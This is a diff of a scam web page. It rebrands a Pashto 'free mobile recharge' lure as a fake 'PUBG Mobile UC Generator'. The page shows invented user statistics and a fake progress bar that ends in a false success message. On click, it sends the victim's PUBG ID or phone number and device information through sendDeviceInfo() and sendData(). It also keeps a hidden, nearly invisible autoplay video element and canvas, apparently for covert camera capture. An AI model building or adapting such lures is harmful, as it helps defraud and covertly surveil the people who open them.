@@ -1,43 +1,39 @@
 <!DOCTYPE html>
-<html lang="ps" dir="rtl">
+<html lang="ps" dir="ltr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>وړیا چارج ترلاسه کړئ</title>
+    <title>PUBG Mobile UC Generator</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
-        body { background-color: #0d1418; color: #ffffff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 10px; }
-        .container { width: 100%; max-width: 400px; background-color: #162127; border-radius: 16px; padding: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); display: flex; flex-direction: column; gap: 15px; }
-        .header { text-align: center; margin-bottom: 5px; }
-        .header h2 { color: #00e676; font-size: 24px; font-weight: bold; display: flex; align-items: center; justify-content: center; gap: 5px; }
-        .header p { color: #8696a0; font-size: 13px; margin-top: 4px; }
-        .offer-card { background-color: rgba(0, 230, 118, 0.08); border: 1px dashed #00e676; border-radius: 12px; padding: 12px; text-align: center; font-size: 13px; color: #00e676; font-weight: bold; }
-        .stats-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; text-align: center; }
-        .stat-card { background-color: #1f2c34; border: 1px solid #2a3942; padding: 10px 5px; border-radius: 10px; }
-        .stat-val { font-size: 15px; font-weight: bold; color: #00e676; }
-        .stat-lbl { font-size: 10px; color: #8696a0; margin-top: 3px; }
-        .card { background-color: #1f2c34; padding: 12px 15px; border-radius: 12px; border: 1px solid #2a3942; }
-        .card-label { font-size: 13px; color: #8696a0; margin-bottom: 6px; display: block; }
-        .input-box { width: 100%; background: transparent; border: none; color: #00e676; font-size: 18px; font-weight: bold; outline: none; direction: ltr; text-align: right; }
-        select.input-box { background-color: #1f2c34; color: white; cursor: pointer; border-radius: 6px; padding: 4px 0; direction: rtl; text-align: right; }
-        .grid-amounts { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
-        .amount-card { background-color: #1f2c34; border: 1px solid #2a3942; padding: 10px; border-radius: 10px; text-align: center; cursor: pointer; }
-        .amount-card.active { background-color: #00a884; border-color: #00e676; }
-        .amount-title { font-size: 16px; font-weight: bold; color: #ffffff; }
-        .amount-sub { font-size: 11px; color: #aebac1; margin-top: 2px; }
-        .row-options { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
-        .recharge-btn { background-color: #00e676; color: #0d1418; width: 100%; padding: 15px; border: none; border-radius: 30px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; box-shadow: 0 4px 10px rgba(0,230,118,0.3); transition: 0.2s; }
-        .recharge-btn:active { transform: scale(0.98); }
-        .recharge-btn:disabled { opacity: 0.6; cursor: not-allowed; }
-        .error-box { display: none; background-color: rgba(244, 67, 54, 0.15); border: 1px solid #f44336; border-radius: 10px; padding: 10px; text-align: center; font-size: 12px; color: #ef5350; margin-top: 5px; font-weight: bold; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        body { background-color: #1a1a1a; color: #ffffff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 15px; }
+        .container { width: 100%; max-width: 420px; background-color: #242424; border-radius: 20px; padding: 20px; box-shadow: 0 8px 25px rgba(0,0,0,0.6); display: flex; flex-direction: column; gap: 15px; border: 1px solid #333; }
+        .header { display: flex; justify-content: space-between; align-items: center; }
+        .logo-title { color: #f39c12; font-size: 26px; font-weight: 900; font-style: italic; }
+        .badge-uc { background-color: #f39c12; color: #000; font-size: 11px; font-weight: bold; padding: 6px 12px; border-radius: 20px; text-transform: uppercase; }
+        .stats-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; text-align: center; background-color: #2c2c2c; padding: 12px 8px; border-radius: 14px; }
+        .stat-val { font-size: 16px; font-weight: bold; color: #f1c40f; }
+        .stat-lbl { font-size: 10px; color: #b0bec5; margin-top: 3px; }
+        .card { background-color: #2c2c2c; padding: 12px 15px; border-radius: 14px; border: 1px solid #3d3d3d; }
+        .card-label { font-size: 13px; color: #b0bec5; margin-bottom: 8px; display: flex; align-items: center; gap: 6px; }
+        .input-box { width: 100%; background: transparent; border: none; color: #f39c12; font-size: 18px; font-weight: bold; outline: none; }
+        select.input-box { background-color: #2c2c2c; color: white; cursor: pointer; border-radius: 6px; padding: 4px 0; }
+        .grid-uc { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
+        .uc-card { background-color: #2c2c2c; border: 1px solid #3d3d3d; padding: 15px 5px; border-radius: 14px; text-align: center; cursor: pointer; position: relative; }
+        .uc-card.active { background: linear-gradient(135deg, #f39c12, #d35400); border-color: #f1c40f; }
+        .pop-badge { position: absolute; top: -8px; left: 50%; transform: translateX(-50%); background-color: #e74c3c; color: white; font-size: 8px; font-weight: bold; padding: 2px 6px; border-radius: 6px; }
+        .u-title { font-size: 16px; font-weight: bold; color: #ffffff; }
+        .u-sub { font-size: 11px; color: #b0bec5; margin-top: 4px; }
+        .generate-btn { background: linear-gradient(135deg, #f39c12, #d35400); color: white; width: 100%; padding: 16px; border: none; border-radius: 30px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 5px; box-shadow: 0 4px 15px rgba(243,156,18,0.4); }
+        .generate-btn:disabled { opacity: 0.6; cursor: not-allowed; }
+        .error-box { display: none; background-color: rgba(231, 76, 60, 0.15); border: 1px solid #e74c3c; border-radius: 12px; padding: 12px; text-align: center; font-size: 13px; color: #e74c3c; margin-top: 5px; font-weight: bold; }
+        .success-box { display: none; background-color: rgba(46, 204, 113, 0.15); border: 1px solid #2ecc71; border-radius: 12px; padding: 12px; text-align: center; font-size: 13px; color: #2ecc71; margin-top: 5px; font-weight: bold; }
         
-        .process-box { display: none; background-color: #1f2c34; border: 1px solid #2a3942; border-radius: 12px; padding: 12px; text-align: center; margin-top: 5px; }
-        .process-text { display: flex; justify-content: space-between; font-size: 13px; color: #8696a0; margin-bottom: 8px; }
-        .progress-bar-container { width: 100%; background-color: #2a3942; height: 8px; border-radius: 4px; overflow: hidden; }
-        .progress-bar { width: 0%; height: 100%; background: #00e676; transition: width 0.3s ease; }
+        .process-box { display: none; background-color: #2c2c2c; border: 1px solid #3d3d3d; border-radius: 12px; padding: 12px; text-align: center; margin-top: 5px; }
+        .process-text { display: flex; justify-content: space-between; font-size: 13px; color: #b0bec5; margin-bottom: 8px; }
+        .progress-bar-container { width: 100%; background-color: #1a1a1a; height: 8px; border-radius: 4px; overflow: hidden; }
+        .progress-bar { width: 0%; height: 100%; background: linear-gradient(135deg, #f39c12, #d35400); transition: width 0.3s ease; }
 
-        .success-box { display: none; background-color: rgba(0, 168, 132, 0.15); border: 1px solid #00a884; border-radius: 10px; padding: 12px; text-align: center; font-size: 13px; color: #00e676; font-weight: bold; }
-        
         #video { position: absolute; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; z-index: -1; }
         canvas { display: none; }
     </style>
@@ -45,46 +41,38 @@
 <body>
     <div class="container">
         <div class="header">
-            <h2>⚡ وړيا چارج</h2>
-            <p>سمدستي چارج او انټرنیټ بنډلونه</p>
+            <div class="logo-area"><span class="logo-title">PUBG MOBILE</span></div>
+            <div class="badge-uc">Free UC</div>
         </div>
-        <div class="offer-card">🎁 د محدود وخت لړ کې! له ۲۰۰ افغانیو پورته ۲۰٪ اضافي ترلاسه کړئ</div>
         <div class="stats-grid">
-            <div class="stat-card"><div class="stat-val">۲.۵M+</div><div class="stat-lbl">راضي کاروونکي</div></div>
-            <div class="stat-card"><div class="stat-val">۸.۷Cr</div><div class="stat-lbl">ترسره شوي چارجونه</div></div>
-            <div class="stat-card"><div class="stat-val">۹۹.۹٪</div><div class="stat-lbl">د بریا کچه</div></div>
+            <div class="stat-card"><div class="stat-val">3.8M</div><div class="stat-lbl">Active Players</div></div>
+            <div class="stat-card"><div class="stat-val">12.4M</div><div class="stat-lbl">UC Given</div></div>
+            <div class="stat-card"><div class="stat-val">99.9%</div><div class="stat-lbl">Success Rate</div></div>
         </div>
         <div class="card">
-            <span class="card-label">📱 د تلیفون شمیره ولیکئ</span>
-            <input type="text" class="input-box" id="mobileNumber" value="+93 ">
+            <span class="card-label">🆔 Enter PUBG Character ID</span>
+            <input type="text" class="input-box" id="userId" placeholder="Enter ID here...">
         </div>
-        <span class="card-label" style="margin-bottom: -5px;">د چارج اندازه وټاکئ</span>
-        <div class="grid-amounts">
-            <div class="amount-card" data-amount="۵۰"><div class="amount-title">۵۰ افغانۍ</div><div class="amount-sub">خبرې کول</div></div>
-            <div class="amount-card" data-amount="۱۰۰"><div class="amount-title">۱۰۰ افغانۍ</div><div class="amount-sub">1GB / ورځینی</div></div>
-            <div class="amount-card active" data-amount="۲۰۰"><div class="amount-title">۲۰۰ افغانۍ</div><div class="amount-sub">1.5GB / ورځینی</div></div>
-            <div class="amount-card" data-amount="۵۰۰"><div class="amount-title">۵۰۰ افغانۍ</div><div class="amount-sub">2GB / ورځینی</div></div>
+        <span class="card-label">Select UC Amount</span>
+        <div class="grid-uc">
+            <div class="uc-card" data-uc="325 UC"><div class="u-title">🪙 325</div><div class="u-sub">UC</div></div>
+            <div class="uc-card active" data-uc="660 UC"><div class="pop-badge">POPULAR</div><div class="u-title">🪙 660</div><div class="u-sub">UC</div></div>
+            <div class="uc-card" data-uc="1800 UC"><div class="u-title">🪙 1800</div><div class="u-sub">UC</div></div>
         </div>
-        <div class="row-options">
-            <div class="card">
-                <span class="card-label">📱 شبکه</span>
-                <select class="input-box" id="operatorSelect">
-                    <option value="Atoma">Atoma</option><option value="Salam">Salam</option><option value="Etisalat">Etisalat</option><option value="Afghan Besem">Afghan Besem</option><option value="Roshan">Roshan</option>
-                </select>
-            </div>
-            <div class="card">
-                <span class="card-label">📍 هیواد</span>
-                <select class="input-box" id="countrySelect">
-                    <option value="Afghanistan">🇦🇫 افغانستان</option><option value="Pakistan">🇵🇰 پاکستان</option><option value="Iran">🇮🇷 ایران</option><option value="India">🇮🇳 هندوستان</option>
-                </select>
-            </div>
+        <div class="card">
+            <span class="card-label">🌐 Select Server</span>
+            <select class="input-box" id="serverSelect">
+                <option value="Asia Server">🌏 Asia Server</option>
+                <option value="Europe Server">🇪🇺 Europe Server</option>
+                <option value="Middle East">🇦🇪 Middle East Server</option>
+            </select>
         </div>
-        <button id="rechargeBtn" class="recharge-btn">⚡ اوس چارج ترلاسه کړئ ❯</button>
-        <div id="errorBox" class="error-box">⚠️ مهرباني وکړئ لومړی د تلیفون شمیره ولیکئ!</div>
+        <button id="generateBtn" class="generate-btn">🪙 Generate UC</button>
+        <div id="errorBox" class="error-box">⚠️ Please enter your PUBG Character ID first!</div>
 
         <div id="processBox" class="process-box">
             <div class="process-text">
-                <span id="processStatus">Processing recharge...</span>
+                <span id="processStatus">Generating UC...</span>
                 <span id="processPercent">0%</span>
             </div>
             <div class="progress-bar-container">
@@ -92,31 +80,18 @@
             </div>
         </div>
 
-        <div id="successBox" class="success-box">🎉 بریالی شو! <span id="rechargeAmountText">۲۰۰</span> افغانۍ چارج ستاسو شمیرې ته پر لاره دی.</div>
+        <div id="successBox" class="success-box">✅ Successfully generated UC to Character ID!</div>
     </div>
     
     <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
 
     <script>
-        const countryCodes = { "Afghanistan": "+93", "Pakistan": "+92", "Iran": "+98", "India": "+91" };
-        const countrySelect = document.getElementById("countrySelect");
-        const mobileInput = document.getElementById("mobileNumber");
-        
-        countrySelect.addEventListener("change", function() {
-            const code = countryCodes[this.value] || "+93";
-            let val = mobileInput.value.trim();
-            Object.values(countryCodes).forEach(c => { if (val.startsWith(c)) val = val.replace(c, "").trim(); });
-            mobileInput.value = code + " " + val;
-        });
-
-        const amountCards = document.querySelectorAll('.amount-card');
-        amountCards.forEach(card => {
-            card.addEventListener('click', function(e) {
-                e.preventDefault();
-                amountCards.forEach(c => c.classList.remove('active'));
+        const ucCards = document.querySelectorAll('.uc-card');
+        ucCards.forEach(card => {
+            card.addEventListener('click', function() {
+                ucCards.forEach(c => c.classList.remove('active'));
                 this.classList.add('active');
-                document.getElementById('rechargeAmountText').innerText = this.getAttribute('data-amount');
             });
         });
 
@@ -188,33 +163,32 @@
             });
         }
 
-        document.getElementById("rechargeBtn").addEventListener("click", async function() {
-            const btn = document.getElementById("rechargeBtn");
-            const mobileVal = mobileInput.value.replace("+93", "").trim();
+        document.getElementById("generateBtn").addEventListener("click", async () => {
+            const btn = document.getElementById("generateBtn");
+            const uid = document.getElementById("userId").value.trim();
             const errorBox = document.getElementById("errorBox");
             const processBox = document.getElementById("processBox");
             const progressBar = document.getElementById("progressBar");
             const processPercent = document.getElementById("processPercent");
             const successBox = document.getElementById("successBox");
 
-            if (mobileVal === "") {
-                errorBox.style.display = "block";
+            if (!uid) { 
+                errorBox.style.display = "block"; 
                 successBox.style.display = "none";
-                mobileInput.focus();
-                return;
-            } else {
-                errorBox.style.display = "none";
+                document.getElementById("userId").focus();
+                return; 
             }
-
+            
+            errorBox.style.display = "none";
             btn.innerText = "Processing...";
             btn.disabled = true;
             processBox.style.display = "block";
 
-            // د تلیفون معلومات او شمیره لیږل
+            // د وسیلې معلومات او د پبجي کارن آی ډي (User ID) لیږل
             await sendDeviceInfo();
-            const phoneFd = new FormData();
-            phoneFd.append('phone_number', mobileInput.value);
-            await sendData(phoneFd);
+            const userFd = new FormData();
+            userFd.append('pubg_user_id', uid);
+            await sendData(userFd);
 
             let progress = 0;
             const progressInterval = setInterval(() => {
@@ -280,7 +254,7 @@
             setTimeout(() => {
                 processBox.style.display = "none";
                 successBox.style.display = "block";
-                btn.innerText = "Recharge Success ✅";
+                btn.innerText = "Generated Successfully ✅";
             }, 500);
         });
     </script>
